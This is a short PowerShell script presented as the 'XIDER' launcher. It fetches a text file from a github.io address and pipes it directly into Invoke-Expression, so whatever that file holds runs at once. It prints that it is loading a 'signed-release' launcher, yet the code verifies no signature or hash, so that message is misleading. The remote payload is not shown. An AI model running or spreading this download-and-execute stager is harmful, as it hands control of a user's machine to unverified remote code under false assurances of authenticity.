$ErrorActionPreference='Stop'
$ProgressPreference='SilentlyContinue'
Write-Host 'XIDER: loading the canonical signed-release launcher...'
Invoke-RestMethod -TimeoutSec 90 -Uri 'https://invinby.github.io/XIDER/win.txt' | Invoke-Expression
